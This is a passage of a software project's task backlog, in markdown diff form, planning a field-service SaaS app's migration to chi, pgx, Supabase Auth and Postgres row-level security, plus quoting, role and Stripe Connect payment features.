+- [x] T151 — Ops docs: Cloud Run setup, deploy/rollback, backups + nightly pg_dump → R2 workflow ✓ (2026-10-16)
+- [x] T152 — Commit generated OpenAPI and TS types for drift gating ✓ (2026-10-16)
+- [ ] T101 — Upload source maps to Sentry for production builds
+
+#### T101 — Upload source maps to Sentry for production builds
+
+**Phase**: 3 · **Category**: Monitoring · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T146
+
+**What it is** — Production frontend errors in Sentry show original file and line instead of minified code.
+
+**What it does** — Add `@sentry/vite-plugin`; build with `build.sourcemap: 'hidden'`; upload during the web job of `release-deploy.yml` with `SENTRY_AUTH_TOKEN`, release = git SHA (matching the SDK's `release`); delete `.map` files from `dist/` before `wrangler deploy`; verify one trace. Original sub-tasks (plugin, CI auth token, upload in the deploy workflow, verify) stand — the workflow is now T146's, not `deploy-release.yml`.
+
+**Why we need it** — Minified stack traces make frontend errors from real users hard to act on.
+
+**Notes** — Old task (P2, Feb 2026). GlitchTip stays for local dev; production is Sentry SaaS. infra audit §5 CHANGE `vite.config.ts`.
+
+---
+
+### Phase 4 — Stack Convergence (LL parity; incremental) (T153, T154, T155, T156, T157, T158, T159, T160, T161, T162, T163, T164, T165, T166)
+
+D2: move to League Looper's stack one strangler step at a time while the app keeps working. Gating subset: the repository/tenant boundary, RLS, Supabase Auth, Resend, R2 and production Redis must be on the target stack before real customers; the chi and pgx ports are not gating. **14 open tasks, ~376h.**
+
+- [ ] T153 — Repositories take ctx + tenantID; services stop taking *gorm.DB; transaction manager
+- [ ] T154 — Postgres RLS backstop keyed on a per-transaction tenant GUC + isolation tests
+- [ ] T155 — Gin → chi
+- [ ] T156 — GORM → pgx/sqlc, one repository at a time
+- [ ] T157 — Drop GORM and sqlite; backend tests on Postgres via testcontainers
+- [ ] T158 — Supabase Auth: own sign-in screens, JWKS verification, users.auth_user_id, invite flow
+- [ ] T159 — Email → Resend only (remove SES/SNS/CloudWatch and the AWS email SDKs)
+- [ ] T160 — Storage → Cloudflare R2 (fix presign host rewrite)
+- [ ] T161 — Production Redis: Upstash for rate limits/lockout/cache, or move them to Postgres
+- [ ] T162 — Frontend server state → TanStack Query v5 (~26 pages)
+- [ ] T163 — Tailwind v4 + semantic theme tokens + dark mode
+- [ ] T164 — React 19, React Router 7, Vite major, ESLint 9, Headless UI 2
+- [ ] T165 — Better Stack uptime/status + PostHog server-side events parity
+- [ ] T166 — Decide money representation (decimal vs integer cents) before the pgx port
+
+#### T153 — Repositories take ctx + tenantID; services stop taking *gorm.DB; transaction manager
+
+**Phase**: 4 · **Category**: Backend · **Hours**: 24 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T102
+
+**What it is** — Every data access goes through a repository method that takes `context.Context` and the tenant ID, and multi-step writes run through one `TxManager`.
+
+**What it does** — Add `ctx` + `tenantID` to every repository interface (`internal/repository/interface.go`; today e.g. `CustomerRepositoryInterface.GetByID(id uuid.UUID)` has neither). Move the services that take `*gorm.DB` directly behind repositories: Invoice (936 lines), Revenue, CustomerReport, ARAging, UnifiedExport, PaymentTerms, Invitation, PaymentReminder, Import, and Job (takes both). Add `TxManager.WithinTx(ctx, func(ctx) error)` carrying the tx in the context, replacing the 4 ad-hoc `Transaction(func(tx *gorm.DB))` sites.
+
+**Why we need it** — It's the boundary everything after depends on: tenant filtering can't be forgotten, request cancellation propagates, the transactions needed by T118/T225/T226 have one shape, RLS (T154) needs a per-transaction hook, and the pgx port (T156) can happen one repository at a time behind it.
+
+**Notes** — correctness audit §8 "Is there a repository boundary already?" and "Suggested sequencing" step 2. D2, D5. Much smaller after T129 deletes the dead repositories and services — do that first if time allows.
+
+---
+
+#### T154 — Postgres RLS backstop keyed on a per-transaction tenant GUC + isolation tests
+
+**Phase**: 4 · **Category**: Security · **Hours**: 12 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T153, T139
+
+**What it is** — Postgres itself refuses to return or modify another tenant's rows, even if application code forgets a filter.
+
+**What it does** — Enable RLS on every tenant-owned table with a policy `tenant_id = current_setting('app.tenant_id')::uuid`; a `withTenant(ctx)` hook in the TxManager runs `SET LOCAL app.tenant_id = …` at the start of each transaction (works with transaction poolers). The app connects as a role without `BYPASSRLS`; migrations and backups use a separate owner role. Platform-admin and scheduled jobs that span tenants use an explicit, audited path. Tests: queries without the GUC return 0 rows; tenant B's GUC can't see tenant A.
+
+**Why we need it** — Defence in depth for the bug class that F-3 showed is catastrophic here; it's how League Looper is set up.
+
+**Notes** — security audit F-3 "Defence in depth"; D5. As a migration (T139), not an edit to the baseline.
+
+---
+
+#### T155 — Gin → chi
+
+**Phase**: 4 · **Category**: Backend · **Hours**: 40 · **Status**: Open · **v1 Gate**: No · **Depends on**: T129
+
+**What it is** — The HTTP layer runs on chi and `net/http` handlers instead of Gin.
+
+**What it does** — Write a tiny adapter (`bind`, `param`, `query`, `respondJSON`, typed context-key helpers), convert the 31 handlers and 13 middleware mechanically (`func(http.Handler) http.Handler`), then routes. Swag annotations carry over. Gin is imported by 66 non-test files today.
+
+**Why we need it** — LL parity (D2) and no Gin-specific traps (`ShouldBindJSON` ignoring Content-Type, `ClientIP` proxy trust). Not gating: the security fixes land on Gin first.
+
+**Notes** — correctness audit §8 coupling counts and estimate (4–6 days; ~30% less after T129).
+
+---
+
+#### T156 — GORM → pgx/sqlc, one repository at a time
+
+**Phase**: 4 · **Category**: Backend · **Hours**: 120 · **Status**: Open · **v1 Gate**: No · **Depends on**: T153, T166
+
+**What it is** — Repositories use pgx with sqlc-generated queries instead of GORM, ported incrementally behind the T153 interfaces.
+
+**What it does** — Order: Tenant, Permission, Membership → Customer, Job → Invoice, Quote and the reports (where the 111 `Preload` calls live). Reproduce soft-delete scoping explicitly in every query; move the logic in GORM hooks (13 model files) into services or DB sequences first; money via the T166 decision (shopspring through `pgx-shopspring-decimal`, or integer cents); JSONB `Value`/`Scan` on `TenantSettings` already exists.
+
+**Why we need it** — GORM hides the bugs the audit found (association saves resetting FKs, `default:true` flips, discarded errors) and blocks LL parity (D2).
+
+**Notes** — correctness audit §8 (3–5 weeks estimate, sequencing step 4). Keep pgx at ≥ v5.9.2 (T117).
+
+---
+
+#### T157 — Drop GORM and sqlite; backend tests on Postgres via testcontainers
+
+**Phase**: 4 · **Category**: Testing · **Hours**: 16 · **Status**: Open · **v1 Gate**: No · **Depends on**: T156
+
+**What it is** — No GORM or sqlite left in the module, and backend tests run against real Postgres, including end-to-end tests of the critical workflows.
+
+**What it does** — Remove `gorm.io/*`, `gorm/driver/sqlite` (test-only, used with AutoMigrate) and the ~902 `gorm:"…"` struct tags. Switch test setup to testcontainers Postgres with the T139 migrations. Add backend integration tests for: register/invite → verify → login; customer → job → complete; quote → accept → job → invoice → paid (incl. Stripe webhook); team invite → accept → permission check; email sends via the mock provider.
+
+**Why we need it** — sqlite + AutoMigrate tests can't catch the Postgres-only bugs the audit found (missing functions, enum NOT NULL, ambiguous columns).
+
+**Notes** — Folds in old P1 "Integration Tests for Critical Workflows" (backend list), old P2 "Email Service Tests" and "Stripe/Payment Flow Tests", and drops "Target 80% Backend Test Coverage" as a metric in favour of these flows. correctness audit §8 step 5.
+
+---
+
+#### T158 — Supabase Auth: own sign-in screens, JWKS verification, users.auth_user_id, invite flow
+
+**Phase**: 4 · **Category**: Auth · **Hours**: 40 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T202, T153
+
+**What it is** — Authentication moves to Supabase Auth while ServicePro keeps its own `users` table (keyed by `auth_user_id`), its own sign-in screens and its invite-only rules.
+
+**What it does** — Backend: verify Supabase JWTs via JWKS in the auth middleware; add `users.auth_user_id` and provision the `users` row on first authenticated request — only if a matching invitation/sign-up invite exists (carries T106's rule); delete `pkg/auth` JWT issuance, password reset/verification services, Redis tokens and lockout (T110/T111 retire). Frontend: Login, Register, Forgot/Reset, Verify, AcceptInvitation pages on `@supabase/supabase-js`, Bearer token to the API, authStore + interceptor + ProtectedRoute rewritten. Google sign-in (supersedes T094) and TOTP MFA (T092) come from Supabase. Branded auth email templates.
+
+**Why we need it** — D2: one auth system across the fleet, no in-house password and token code to keep secure, and Google sign-in/MFA for free.
+
+**Notes** — frontend audit §6 "Supabase Auth client" (3–5 days frontend; supabase-js stores the session in `localStorage` by default, a regression vs httpOnly cookies — decide knowingly or use the cookie helpers). LL `docs/auth-migration.md` is the reference. Needs a Supabase project, hence T202 (judgment call: the brief said T203). Backups must then include `auth.*` (T151).
+
+---
+
+#### T159 — Email → Resend only (remove SES/SNS/CloudWatch and the AWS email SDKs)
+
+**Phase**: 4 · **Category**: Email · **Hours**: 6 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T113
+
+**What it is** — Resend is the only email provider (Mailpit/SMTP for local dev), with bounce/complaint webhooks and retries.
+
+**What it does** — Delete `pkg/clients/email/ses`, `pkg/clients/sms/sns`, the CloudWatch logging/metrics providers and the `aws-sdk-go-v2/service/{ses,sns,cloudwatch,cloudwatchlogs}` modules (S3 SDK stays for R2). Replace the SES bounce/notification routes (`routes/v1/auth_routes.go:29-30`) with a signed Resend webhook (`email.bounced`, `email.complained`) that marks addresses undeliverable. Retry transient failures (429/5xx) with capped exponential backoff and jitter; fail fast on invalid addresses.
+
+**Why we need it** — SES is configured by accident (default env) and unused; one provider means one set of webhooks, one domain setup (T206) and fewer vulnerable modules.
+
+**Notes** — correctness audit §2 "Resend migration notes", §5.5 step 3. Folds in old P1 "Email Retry Logic with Exponential Backoff"; the old "Email Client Enhancements" (SES) section is dropped.
+
+---
+
+#### T160 — Storage → Cloudflare R2 (fix presign host rewrite)
+
+**Phase**: 4 · **Category**: Infra · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T113
+
+**What it is** — Files (PDFs, avatars, job photos, exports) live in R2, and presigned links work.
+
+**What it does** — Configure `S3_COMPATIBLE_ENDPOINT=https://<acct>.r2.cloudflarestorage.com`, region `auto`, bucket and keys (override already at `s3.go:105-108`). Fix `s3.go:328-329`, which rewrites the host of presigned URLs to `PublicURL` — SigV4 signs the Host header, so the links fail with `SignatureDoesNotMatch`; only rewrite behind `S3_COMPATIBLE_PRESIGN_REWRITE` for local MinIO, and use `PublicURL` only for genuinely public objects. Fix `.env.example:121,132`, which sets both. Enforce content-type allow-list and size limits on upload.
+
+**Why we need it** — Following `.env.example` today breaks every invoice and quote PDF link (`document_pdf_service.go:250`).
+
+**Notes** — correctness audit §2 "R2 migration notes". D2. Drops the old "Storage Client Enhancements" section except MIME/size validation, folded here.
+
+---
+
+#### T161 — Production Redis: Upstash for rate limits/lockout/cache, or move them to Postgres
+
+**Phase**: 4 · **Category**: Infra · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T142
+
+**What it is** — A decided, working production setup for whatever still uses Redis after T142.
+
+**What it does** — Per OD-3: either provision Upstash (`rediss://`, free tier) and set `REDIS_URL` on Cloud Run, or move the remaining uses (rate limits, permission cache) to Postgres/in-memory and remove Redis from production. Document the choice in `docs/ops/cloud-run-setup.md` and Fleet.
+
+**Why we need it** — Per-instance in-memory rate limits are only acceptable with a small `--max-instances`; the choice affects cost and the Fleet entry.
+
+**Notes** — infra audit §8 decision 1. Folds in old P2 "Redis Caching for Frequent Queries" — not needed at current scale; add caching only for a measured hot query.
+
+---
+
+#### T162 — Frontend server state → TanStack Query v5 (~26 pages)
+
+**Phase**: 4 · **Category**: Frontend · **Hours**: 48 · **Status**: Open · **v1 Gate**: No · **Depends on**: T137
+
+**What it is** — All server data on live pages comes from `useQuery`/`useMutation` with tenant-scoped key factories; Zustand holds only UI and session state.
+
+**What it does** — Build `queries/` per resource with keys like `[tenantId, 'customers', filters]` (1 d); convert list pages — Customers, Jobs, Quotes, Invoices, Reports (2–3 d); detail/edit pages with mutations and invalidation (2–3 d); move server data out of `tenantStore`, `billingStore`, `membershipStore` (1 d). No persister.
+
+**Why we need it** — Fixes errors-as-empty-states, double requests and out-of-order responses (3.5, 3.7) at the root and matches LL (D2).
+
+**Notes** — frontend audit §6 (5–8 days). Today React Query is installed but used almost only by dead code.
+
+---
+
+#### T163 — Tailwind v4 + semantic theme tokens + dark mode
+
+**Phase**: 4 · **Category**: Frontend · **Hours**: 40 · **Status**: Open · **v1 Gate**: No · **Depends on**: T137
+
+**What it is** — Styling uses Tailwind v4 with ~15 semantic CSS-variable tokens defined in one file, switching light/dark from `prefers-color-scheme` or `[data-theme]`.
+
+**What it does** — Run `npx @tailwindcss/upgrade` and fix renamed utilities (`shadow-sm`→`shadow-xs`, ring width, `currentColor` default border vs the `* { @apply border-neutral-200 }` base rule). Define tokens (`--color-surface`, `--color-fg`, `--color-muted`, `--color-border`, `--color-accent`, status colours) in `@theme inline`; codemod the ~2,820 hard palette classes (`neutral-*` 1,036, `gray-*` 834, `blue-*` 352, `primary-*` 349); manual review of ~120 component files; dark QA. Delete `theme/colors.ts` and the `tailwind.config.js` palette.
+
+**Why we need it** — One-file theming like LL, consistent greys (two are mixed today), and dark mode (0 `dark:` classes today).
+
+**Notes** — frontend audit §6 (0.5–1 d upgrade + 4–6 d tokens). Folds in old P3 "Standardize Component Patterns".
+
+---
+
+#### T164 — React 19, React Router 7, Vite major, ESLint 9, Headless UI 2
+
+**Phase**: 4 · **Category**: Frontend · **Hours**: 16 · **Status**: Open · **v1 Gate**: No · **Depends on**: T137
+
+**What it is** — The frontend runs on current majors.
+
+**What it does** — React 18.3 → 19 (blockers: `@headlessui/react` v1 in `shared/Modal/Modal.tsx` → v2 or native `<dialog>`; react-big-calendar peer range; `forwardRef`/`defaultProps` codemods). React Router 6.30 → 7 library mode (enable future flags first). Vite 5.4 → current with plugin-react (drop `vite-plugin-pwa`, `vite-plugin-compression`, the custom `manualChunks`). ESLint 8.57 (EOL) → 9/10, react-hooks 7. While here: date-fns 4 + `@date-fns/tz`, zod 4, lucide-react, Stripe libs. Stay on TypeScript 5.9.
+
+**Why we need it** — React 18 and ESLint 8 are end-of-line; the newer react-hooks rules surface the `exhaustive-deps` suppressions.
+
+**Notes** — frontend audit §4.5, §6. Folds in old P2 "Audit useCallback/useMemo Usage" (the React 19 lint rules cover it).
+
+---
+
+#### T165 — Better Stack uptime/status + PostHog server-side events parity
+
+**Phase**: 4 · **Category**: Monitoring · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T204
+
+**What it is** — External uptime checks on the user path and the API, a public status page, and server-side PostHog events for the business milestones.
+
+**What it does** — Better Stack monitors on `https://servicepro.sharkfins.xyz/version` (edge path) and the run.app `/health/ready`; status page (published in T208). PostHog server events from `posthog-go` (today only `payment_received`, `routes.go:155-163`): `tenant_created`, `invoice_sent`, `invoice_paid`, `quote_accepted`, `job_completed`, `connect_onboarded`, keyed by tenant.
+
+**Why we need it** — Frontend-only analytics miss webhook-driven events (payments), and nothing tells the owner the API is down.
+
+**Notes** — D2 (Better Stack, PostHog). LL T371–T376 observability plan is the reference.
+
+---
+
+#### T166 — Decide money representation (decimal vs integer cents) before the pgx port
+
+**Phase**: 4 · **Category**: Research · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — A recorded decision (new D-item) on how money is stored and passed — shopspring decimal as today, or integer cents (the Travelify rule) — with a conversion plan.
+
+**What it does** — Inventory today's state: `shopspring/decimal` + `DECIMAL(12,2)` with `ConvertDecimalToCents` for Stripe; Job/JobMaterial money as `float64` in Go vs DECIMAL in SQL (`models/job.go:65-68,144-147`); ten frontend `formatCurrency` helpers mixing cents and dollars. Weigh: sqlc type mapping, Stripe's integer minor units, multi-currency exponents, tax rounding rules. Write the decision into this file's Architecture decisions and the plan into T156.
+
+**Why we need it** — sqlc generates types from the schema, so this must be settled before T156 ports the money tables.
+
+**Notes** — OD-5; D6. correctness audit 7.M14; frontend audit 3.4.
+
+---
+
+### Phase 5 — Core Workflow & Quoting (T028, T029, T030, T033, T035, T041, T042, T051, T052, T058, T060, T062, T076, T080, T082, T167, T168)
+
+The quote → job → invoice loop, roles for field and office staff, recurring agreements and the price book. **17 open tasks, ~76h.**
+
+- [ ] T028 — Add "Convert Quote to Job" button
+- [ ] T029 — Add "Generate Invoice from Job" button
+- [ ] T030 — Auto-populate invoice from job data
+- [ ] T033 — Add "Jobs Needing Invoice" dashboard widget
+- [ ] T035 — Create Technician role
+- [ ] T041 — Implement quote auto follow-ups
+- [ ] T042 — Build follow-up queue UI
+- [ ] T051 — Implement quote follow-up email sequence
+- [ ] T052 — Create Dispatcher role
+- [ ] T058 — Add required fields validation by job stage
+- [ ] T060 — Create quote template system (good/better/best)
+- [ ] T062 — Add quote aging tracking
+- [ ] T076 — Add "Recreate Last Quote" button
+- [ ] T080 — Create terms & conditions templates
+- [ ] T082 — Add "Create Quote from Job" button
+- [ ] T167 — Recurring service agreements UI wired to the recurrence engine
+- [ ] T168 — Price book (services and materials catalog with flat-rate pricing)
+
+#### T028 — Add "Convert Quote to Job" button
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 3 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T224
+
+**What it is** — One-click conversion from an accepted quote to a job ready to schedule.
+
+**What it does** — Button on `QuoteDetailPage` only when status is `accepted`; creates a job with the quote's customer (and site, once T186 exists), service type and line items; links `jobs.quote_id`; navigates to the job detail or scheduling view. A quote converts once (button becomes "View job").
+
+**Why we need it** — The core loop — quote accepted → job scheduled → work done → invoice sent — is what every competitor has; the office must schedule the work the moment the customer says yes.
+
+**Notes** — Old task (Feb 2026 TODO P0 "Quoting – Critical"). Acceptance: button visible only on accepted quotes; job carries all relevant quote data; user can schedule immediately. Correct quote states depend on T224 (accept race, customer edits reverting). `docs/product/competitive-research-2026-10.md` §2 row 6, §5 MVP #2.
+
+---
+
+#### T029 — Add "Generate Invoice from Job" button
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 2 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T225, T124
+
+**What it is** — One-click invoice generation from a completed job.
+
+**What it does** — Button on `JobDetailPage` when status is `completed` and the job has no invoice; creates the invoice pre-populated per T030, links it to the job, moves the job to `invoiced` (T124), and opens the invoice for review/send.
+
+**Why we need it** — Techs complete work and the office forgets to bill; completed-but-unbilled work is the #1 cash-flow leak for small service businesses.
+
+**Notes** — Old task (Feb 2026 TODO P0 "Invoicing – Critical"). Acceptance: visible only on completed, uninvoiced jobs; invoice linked to job; user lands on the invoice. Must use T225's double-invoicing guard (correctness audit 7.M5: today `invoice_handler.go:302-303` accepts any `job_id`).
+
+---
+
+#### T030 — Auto-populate invoice from job data
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T029
+
+**What it is** — The invoice generated from a job already contains the labor, materials, notes and photo links the tech recorded.
+
+**What it does** — Map `job.materials` → invoice line items; labor from actual time (`ActualStartAt`/`ActualEndAt` today, the T177 time clock later) × the tenant's labor rate or price-book item (T168); job notes into the invoice description; photos (T174) linked from the invoice. Totals computed by the server (T225).
+
+**Why we need it** — Eliminates re-typing ("2 hours labor, replaced capacitor $45, customer approved additional work") and makes sure nothing done in the field goes unbilled.
+
+**Notes** — Old task (Feb 2026 TODO P0). Acceptance: all job materials appear as lines; labor from actual time; notes/photos reachable from the invoice. Job money is `float64` in Go (correctness audit 7.M14) — convert via decimal until T166 decides.
+
+---
+
+#### T033 — Add "Jobs Needing Invoice" dashboard widget
+
+**Phase**: 5 · **Category**: Reporting · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: T029
+
+**What it is** — A dashboard count and list of completed jobs without an invoice.
+
+**What it does** — Query jobs where `status = completed` and no linked invoice (tenant-scoped, T102); widget with count, click-through to the filtered job list, and a quick "Generate invoice" action (T029).
+
+**Why we need it** — "You have 7 jobs to bill!" — money left on the table is the #1 cash-flow killer for small service businesses.
+
+**Notes** — Old task (Feb 2026 TODO P0 "Dashboard – Critical"). Acceptance: accurate count, one-click navigation, prominent placement. T047 ("stuck work") reuses the query.
+
+---
+
+#### T035 — Create Technician role
+
+**Phase**: 5 · **Category**: Auth · **Hours**: 4 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T104
+
+**What it is** — A role for field workers that sees and updates only their own assigned jobs and never sees customer financials.
+
+**What it does** — Follow CLAUDE.md's permission steps (`permissions/constants.go`, `AllPermissions()`, `DefaultRolePermissions()`, `PermissionsByResource()`, seed grants in `001_schema.sql` or a T139 migration). Include: view assigned jobs, update job status, add notes/photos, log time/materials. Exclude: other techs' jobs, customer financial data, create/edit customers, reports. "Assigned jobs only" needs a row filter in the job repository (assignment-based), not just a permission flag; hide financial fields in job/customer responses for this role (full field-level controls are T075).
+
+**Why we need it** — Techs need their jobs, notes, photos and status buttons in the field (T173), but owners won't hand them "customer owes $5,000".
+
+**Notes** — Old task (Feb 2026 TODO P0 "Roles – Critical"). Acceptance: role created with correct permissions; financial data hidden; tech sees only their assignments. Per-tenant permission evaluation (T104) must land first or the role leaks across tenants.
+
+---
+
+#### T041 — Implement quote auto follow-ups
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 6 · **Status**: Open · **v1 Gate**: No · **Depends on**: T141, T159
+
+**What it is** — Automated follow-up messages for sent quotes that haven't been answered.
+
+**What it does** — A scheduled job (T141) finds `sent` quotes by age and sends follow-ups at configurable intervals (e.g. day 3, 7, 14 "expiring soon"); records each send; stops on accept/decline/expiry.
+
+**Why we need it** — Consistent follow-up lifts close rates (the old TODO cited 20–30%).
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: automatic, configurable timing, none after response, history kept. T051 defines the sequence content; consider merging the two when building.
+
+---
+
+#### T042 — Build follow-up queue UI
+
+**Phase**: 5 · **Category**: UX · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T062
+
+**What it is** — A list of quotes needing a manual follow-up today.
+
+**What it does** — Pending quotes sorted by age/value/customer with last contact date; quick actions to log a call or email (T036) which updates last contact.
+
+**Why we need it** — "Call these 5 customers today" — an organised view for sales follow-up.
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: shows all pending quotes, sortable/filterable, logs follow-up actions. T046 is the dashboard widget for it.
+
+---
+
+#### T051 — Implement quote follow-up email sequence
+
+**Phase**: 5 · **Category**: Email · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T041, T072
+
+**What it is** — The content and rules of the multi-touch quote follow-up sequence.
+
+**What it does** — Templates per touch (day 3 check-in, day 7 address concerns, day 14 expiry warning) using T072/T073 templates and variables; stops when the quote is resolved.
+
+**Why we need it** — Automated nurturing of pending quotes without staff effort.
+
+**Notes** — Old task (Feb 2026 TODO P1). Acceptance: runs automatically, customizable templates, stops when resolved. Overlaps T041 (engine) — merge if simpler.
+
+---
+
+#### T052 — Create Dispatcher role
+
+**Phase**: 5 · **Category**: Auth · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: T104
+
+**What it is** — A role for office staff who schedule and assign but don't see money.
+
+**What it does** — Include: view all jobs, create/edit schedules, assign technicians, view customer contact info. Exclude: invoice amounts, payment history, financial reports, pricing changes. Same CLAUDE.md permission steps as T035.
+
+**Why we need it** — Dispatchers need the whole schedule but not financial visibility.
+
+**Notes** — Old task (Feb 2026 TODO P1 "Roles – High Priority"). Acceptance: role created; financial data hidden from dispatchers.
+
+---
+
+#### T058 — Add required fields validation by job stage
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 4 · **Status**: Open · **v1 Gate**: No · **Depends on**: T124
+
+**What it is** — Configurable data that must exist before a job can move to a given status (e.g. completion requires notes, photos and time logged).
+
+**What it does** — Per-tenant rules keyed by target status, evaluated inside the T124 transition; clear error listing what's missing; T175 checklists can be one of the required items.
+
+**Why we need it** — Stops techs marking jobs complete without the documentation commercial customers expect as proof of service.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: configurable required fields per status; validation on status change; clear messages. Original confidence: medium — exact requirements per stage unclear; validate in T218 interviews.
+
+---
+
+#### T060 — Create quote template system (good/better/best)
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 8 · **Status**: Open · **v1 Gate**: No · **Depends on**: T168
+
+**What it is** — Reusable quote templates with tiered options the customer chooses between.
+
+**What it does** — Templates hold line items (from the price book, T168), terms (T080) and optional tiers ("Basic tune-up $149 / Premium $249 / Complete $399"); one-click apply to a new quote; the public approval page (T183) lets the customer pick a tier.
+
+**Why we need it** — Upsell pattern that lifts average ticket; competitors (HCP, Jobber optional line items) all have it.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: create/edit templates with line items; one-click apply. The old "Orphaned Features → Quote Template System" spec (variable substitution, categories, versioning, import/export) and the unreachable `frontend/src/components/templates/*` (deleted in T137) are reference only — build the smaller version.
+
+---
+
+#### T062 — Add quote aging tracking
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Every pending quote shows how long it has been waiting.
+
+**What it does** — Days since `sent_at` shown on the quote list, sortable, filterable by age range.
+
+**Why we need it** — Prioritises follow-ups; feeds T045 and T042.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: age displayed, sortable, filter by range.
+
+---
+
+#### T076 — Add "Recreate Last Quote" button
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 1 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — One click on the customer page clones that customer's most recent quote.
+
+**What it does** — Customer detail button calling the existing clone-quote action (shipped 2025-01-30) on the latest quote; opens the new draft.
+
+**Why we need it** — Customers call back months later wanting the same work.
+
+**Notes** — Old task (Feb 2026 TODO P3).
+
+---
+
+#### T080 — Create terms & conditions templates
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 3 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Reusable legal text blocks selectable on quotes and invoices.
+
+**What it does** — Tenant-level CRUD for T&C blocks; default per document type; chosen block rendered on PDFs and the public approval page (T183).
+
+**Why we need it** — Consistent terms across documents; commercial customers expect them.
+
+**Notes** — Old task (Feb 2026 TODO P3). Invoices already carry a T&C field (`docs/product/competitive-research-2026-10.md` §0) — this adds reusable templates.
+
+---
+
+#### T082 — Add "Create Quote from Job" button
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 2 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — Generate a new quote from a job, e.g. "how much to replace the whole unit?" after a repair visit.
+
+**What it does** — Job detail action creating a draft quote with the job's customer/site and optionally its materials as starting lines.
+
+**Why we need it** — Turns service visits into replacement or upsell quotes.
+
+**Notes** — Old task (Feb 2026 TODO P3; original confidence medium — less common workflow).
+
+---
+
+#### T167 — Recurring service agreements UI wired to the recurrence engine
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 12 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T141, T102
+
+**What it is** — Customers can have service agreements (e.g. "nightly cleaning Mon–Fri", "quarterly HVAC PM") that generate jobs automatically, managed from the UI.
+
+**What it does** — Agreement model: customer (+ site, T186), cadence, line items/price, start/end, assigned tech, auto-invoice option. A scheduled job (T141) generates the next occurrences idempotently (unique per agreement+date). Decide between reviving `backend/internal/services/recurring` (never linked into the binary; known bugs: Jan 31 + 1 month skips February, time of day treated as UTC and not DST-aware, occurrence cap counted per window not per series, nil `JobTemplateID` panic — `recurring/generator.go:286,373-376,180-182,380`) or rewriting it small. The old frontend `components/recurring/` was deleted in T018.
+
+**Why we need it** — Commercial cleaning and maintenance work is recurring by nature; recurring schedules are half of the lock-in moat.
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §2 row 8, §4.2, §5 MVP #7; correctness audit 5.1, 7.L5. Autopay agreements are T191.
+
+---
+
+#### T168 — Price book (services and materials catalog with flat-rate pricing)
+
+**Phase**: 5 · **Category**: Feature · **Hours**: 12 · **Status**: Open · **v1 Gate**: No · **Depends on**: none
+
+**What it is** — A per-tenant catalog of services and materials with unit, cost, flat-rate price and tax flag, picked into quotes, jobs and invoices.
+
+**What it does** — Catalog CRUD + CSV import; line-item pickers on quotes/invoices/job materials; cost stored for job costing (T198); categories; inactive items hidden but kept for history.
+
+**Why we need it** — Consistent pricing across staff, faster quoting, and the substrate for good/better/best (T060) and AI quote drafting (T215).
+
+**Notes** — `docs/product/competitive-research-2026-10.md` §3 "Price book / flat-rate pricing".
+
+---
+
+### Phase 6 — Payments to the Business (T061, T063, T083, T169, T170, T171, T172)
+
+Stripe Connect so tenants actually receive the money, ACH for B2B, deposits, autopay and in-person payments. **7 open tasks, ~72h.**
+
+- [ ] T061 — Add required deposit to accept quote
+- [ ] T063 — Add deposit tracking and application
+- [ ] T083 — Implement late fee calculation
+- [ ] T169 — Stripe Connect Express onboarding; invoice payments routed to the tenant
+- [ ] T170 — Card + ACH invoice payments, ACH preferred for B2B
+- [ ] T171 — Saved payment methods + autopay
+- [ ] T172 — Tap to Pay via Stripe Terminal
+
+#### T061 — Add required deposit to accept quote
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 6 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T169, T183
+
+**What it is** — A quote can require a deposit (fixed amount or percentage), paid by the customer as part of accepting it.
+
+**What it does** — Deposit settings on the quote/template; the public approval page (T183) collects payment via the tenant's connected account before the quote becomes `accepted`; deposit recorded separately (T063).
+
+**Why we need it** — Common for big jobs ("pay $200 to confirm") and secures commitment before materials are ordered.
+
+**Notes** — Old task (Feb 2026 TODO P2). Acceptance: configurable amount/percentage; acceptance triggers payment; deposit tracked separately.
+
+---
+
+#### T063 — Add deposit tracking and application
+
+**Phase**: 6 · **Category**: Payments · **Hours**: 6 · **Status**: Open · **v1 Gate**: Yes · **Depends on**: T061, T118
+
